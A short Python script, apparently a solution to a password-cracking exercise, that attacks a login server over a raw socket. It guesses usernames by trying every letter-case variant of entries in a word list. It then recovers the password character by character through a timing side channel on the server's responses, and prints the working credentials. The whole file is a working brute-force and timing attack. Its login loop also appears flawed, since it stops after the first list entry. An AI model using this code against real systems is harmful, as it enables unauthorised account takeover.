import sys
import socket
import itertools
import json
from datetime import datetime

args = sys.argv
address = (args[1], int(args[2]))
symbols = ' 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
base_pw = ''

with socket.socket() as client_socket:
    client_socket.connect(address)
    with open('logins.txt', 'r') as login_list:
        guessing_login = True
        while guessing_login:
            for login in login_list:
                for new_login in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in login.strip('\n')))):
                    json_input = json.dumps({"login": new_login, "password": ' '}, indent=4)
                    client_socket.send(json_input.encode())
                    response = json.loads(client_socket.recv(1024).decode())
                    if response["result"] == 'Wrong password!':
                        guessing_login = False
                        break
                break
    guessing_password = True
    while guessing_password:
        for pw_character in itertools.product(symbols, repeat=1):
            pw_character = ''.join(pw_character)
            json_input = json.dumps({"login": new_login, "password": base_pw + pw_character}, indent=4)
            start = datetime.now()
            client_socket.send(json_input.encode())
            response = json.loads(client_socket.recv(1024).decode())
            finish = datetime.now()
            time_difference = finish - start
            if time_difference.microseconds > 2000:
                base_pw += pw_character
            elif response["result"] == 'Connection success!':
                guessing_password = False
                break
    print(json_input)
    
